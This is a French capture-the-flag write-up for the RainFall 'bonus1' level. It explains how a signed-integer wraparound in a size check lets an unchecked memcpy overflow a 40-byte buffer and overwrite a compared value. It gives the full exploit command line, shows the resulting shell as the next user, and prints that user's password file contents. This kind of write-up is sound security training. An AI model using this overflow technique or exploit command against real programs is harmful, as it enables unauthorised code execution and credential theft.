```
bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 test 12
bonus1@RainFall:~$ ./bonus1 test
```

Nous sommes sur un exectuable qui segfalt sans arguments et qui avec semble ne rien faire.
Pas de fonction, qu'un main qui parait plutot court.
Un buffer de taille 40 est créé, puis un atoi sur l'argv[1] d'où le segfalt si pas d'arguments.
Ensuite il y a un memcpy qui n'est pas protégé contre les buffer overflow.
Si l'on veut que le memcpy soit effecuté il faut que l'argv 1 soit plus petit ou egal a 9
Ensuite le buffer sera alloué de ce nombre * 4 donc maximum 36 (9*4).
Hors on souhaite que ce buffer soit egal à 0x574f4c46.
Nous aurons donc besoin de 44 caracteres pour modifier le nombre que l'on compare car il est contingent à notre string, hors pour le moment le max que nous arrivions
à avoir est 36.
Nous allons donc devoir réussir à lui passer au moins le chiffre 11.
Pour ce faire, nous allons utiliser l'underflow.
Pour faire simple, le type que récupère le memcpy est un int. Si ce nombre multiplié par 4 est supérieur alors un nombre négatif passera en positif et vis versa.
Essayons donc avec l'int minimum : -2147483647

```
./bonus1 -2147483637 $(python -c 'print "A"*40+ "\x46\x4c\x4f\x57"')
whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
